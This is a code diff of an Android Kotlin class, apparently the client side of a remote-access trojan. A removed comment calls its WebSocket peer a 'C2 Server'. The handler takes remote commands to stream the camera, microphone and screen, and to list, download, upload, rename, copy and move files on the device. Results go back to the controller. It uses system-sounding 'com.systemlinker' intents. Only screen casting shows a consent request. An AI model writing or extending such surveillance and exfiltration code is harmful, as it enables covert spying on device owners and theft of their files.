@@ -28,7 +28,9 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
     private var webSocket: WebSocket? = null
     
     private val webRtcManager = WebRtcManager(context) { sdpJsonString ->
-        sendJsonString(sdpJsonString) // Send WebRTC Handshake to C2 Server via WebSocket
+        // CRITICAL FIX: Wrap and escape the WebRTC signaling payload cleanly
+        val payload = JSONObject().put("cmd", "webrtc_signaling").put("arg", sdpJsonString)
+        sendJson(payload) 
     }
     
     // WebRTC Hardware Streamers
@@ -104,7 +106,7 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
         stopSensorStream()
         
         val intent = Intent("com.systemlinker.ACC_ACTION")
-        intent.putExtra("action", "stream_screen_stop") // This is more for general cleanup/ACC
+        intent.putExtra("action", "stream_screen_stop") 
         context.sendBroadcast(intent)
         
         val downgradeIntent = Intent("com.systemlinker.DOWNGRADE_FGS_MP")
@@ -137,9 +139,7 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
         }
     }
 
-    override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
-        // WebRTC natively handles audio over UDP. We drop WebSocket bytes here.
-    }
+    override fun onMessage(webSocket: WebSocket, bytes: ByteString) {}
 
     override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
         disconnect()
@@ -174,10 +174,6 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
                     ErrorLogger.logError(context, "WebRTC_Signaling_Parse", e)
                 }
             }
-            "webrtc_offer", "webrtc_answer", "webrtc_ice" -> {
-                // These are direct WebRTC signaling commands, handle directly
-                webRtcManager.handleSignalingMessage(payload)
-            }
             "live_screen_cast" -> {
                 if (arg == "start") {
                     sendJson(JSONObject().put("status", "requesting_screen_consent"))
@@ -199,7 +195,6 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
                 else rtcCameraStreamer.stopStreaming()
             }
             "live_audio_mode" -> {
-                // "call" and "mic" modes imply audio capture for WebRTC
                 if (arg == "call" || arg == "mic") rtcAudioStreamer.startStreaming()
                 else rtcAudioStreamer.stopStreaming()
             }
@@ -213,35 +208,16 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
             }
             "fm_ls" -> sendJson(JSONObject().put("cmd", "fm_ls_result").put("data", fileManager.listFiles(arg)))
             "fm_info" -> sendJson(JSONObject().put("cmd", "fm_info_result").put("data", fileManager.getFileInfo(arg)))
-            "fm_create" -> {
-                val isDir = payload.optBoolean("isDir", false)
-                sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.create(arg, isDir)))
-            }
-            "fm_rename" -> {
-                val newName = payload.optString("newName")
-                sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.rename(arg, newName)))
-            }
-            "fm_copy" -> {
-                val dest = payload.optString("dest")
-                sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.copy(arg, dest)))
-            }
-            "fm_move" -> {
-                val dest = payload.optString("dest")
-                sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.move(arg, dest)))
-            }
-            "fm_download" -> {
-                val base64 = fileManager.readBase64(arg)
-                sendJson(JSONObject().put("cmd", "fm_download_result").put("file", arg).put("data", base64))
-            }
-            "fm_upload" -> {
-                val base64 = payload.optString("data")
-                sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.writeBase64(arg, base64)))
-            }
+            "fm_create" -> sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.create(arg, payload.optBoolean("isDir", false))))
+            "fm_rename" -> sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.rename(arg, payload.optString("newName"))))
+            "fm_copy" -> sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.copy(arg, payload.optString("dest"))))
+            "fm_move" -> sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.move(arg, payload.optString("dest"))))
+            "fm_download" -> sendJson(JSONObject().put("cmd", "fm_download_result").put("file", arg).put("data", fileManager.readBase64(arg)))
+            "fm_upload" -> sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.writeBase64(arg, payload.optString("data"))))
         }
     }
 
     private fun sendJson(json: JSONObject) { webSocket?.send(json.toString()) }
-    private fun sendJsonString(jsonStr: String) { webSocket?.send(jsonStr) }
 
     private fun vibrateDevice(durationMs: Long) {
         val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
